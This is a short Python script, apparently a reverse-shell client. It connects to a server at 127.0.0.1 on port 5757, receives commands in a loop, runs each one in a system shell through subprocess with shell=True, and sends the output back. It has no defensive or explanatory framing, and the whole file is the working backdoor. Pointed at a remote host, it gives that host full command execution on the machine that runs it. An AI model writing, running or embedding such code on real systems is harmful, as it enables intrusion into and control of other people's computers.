import socket
import subprocess

def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5757  
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))

    while True:
        command = client.recv(1024).decode('utf-8')
        if command == 'exit':
            break
        
        try:
            output = subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            output = str(e.output)
        client.send(output)
    
    client.close()

if __name__ == "__main__":
    connect_to_server()